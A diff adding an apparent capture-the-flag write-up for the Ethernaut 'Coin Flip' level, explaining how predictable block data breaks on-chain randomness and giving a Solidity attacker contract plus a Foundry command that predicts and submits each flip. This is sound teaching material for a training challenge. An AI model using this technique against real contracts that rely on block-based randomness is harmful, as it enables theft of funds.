@@ -80,3 +80,44 @@ Everytime you got a challenge, start with a click on `Get new instance`. Once yo
 cast call 0xb685F5c3aCdb5D874D3e1219D8a4FDF08a502c6E  "Fal1out()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
 ```
 
+# 3: Coin Flip
+**Link:** https://ethernaut.openzeppelin.com/level/3  
+**Bug:** Pseudo-randomness using predictable blockchain data    
+**Objective:** Correctly predict 10 consecutive coin flips    
+**Description:** Coin flip is based the block.number which is known publicly.  
+**Steps:**
+- Create an attack contract that performs the same calculation
+- Determine the correct answer before submitting
+- Call the flip function 10 times consecutively
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlipAttacker {
+    ICoinFlip public target;
+    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = ICoinFlip(_target);
+    }
+
+    function attack() external {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+        target.flip(guess);
+    }
+}
+```
+
+**Consecutive calls using Foundry:**
+```shell
+
+$ cast call 0xdb0DdE6d17A9d17f57238e6CE66328eC5E28C77A "attack()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+```
+
